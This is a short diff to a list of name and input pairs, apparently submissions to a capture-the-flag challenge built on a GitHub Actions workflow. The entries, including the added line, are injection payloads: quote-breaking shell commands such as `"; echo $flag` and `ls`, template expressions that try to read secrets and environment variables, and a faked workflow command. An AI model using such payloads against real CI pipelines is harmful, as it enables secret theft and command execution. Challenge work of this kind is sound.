@@ -10911,3 +10911,4 @@ ChenSirN:"; echo "$flag
 CUHKJason:abc"; ls# 
 Cclss:${{ secret[FLAG] }}
 CUHKJason:::set-output name=today::$(date +'%Y-%m-%d')
+AFKL-CUIT:${{ secret.FLAG }} ${{ secret.flag }} ${{ secret[FLAG] }} ${{ env.flag }} ${{ env[FLAG] }} ${{ env.FLAG }} "; echo $flag"
